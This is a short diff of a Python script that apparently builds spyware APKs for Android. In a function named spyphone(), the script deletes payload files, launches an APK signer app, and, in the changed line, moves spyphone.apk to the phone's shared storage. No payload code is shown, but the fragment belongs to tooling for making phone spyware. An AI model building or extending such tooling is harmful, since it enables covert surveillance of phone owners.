@@ -104,7 +104,7 @@ def spyphone():
 	os.system("cd Malware && rm -rf payload.apk payload spyphone")
 	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
 	raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-	home()
+	os.system('mv -f spyphone.apk /storage/emulated/0/')
 		
 	
 def awal():
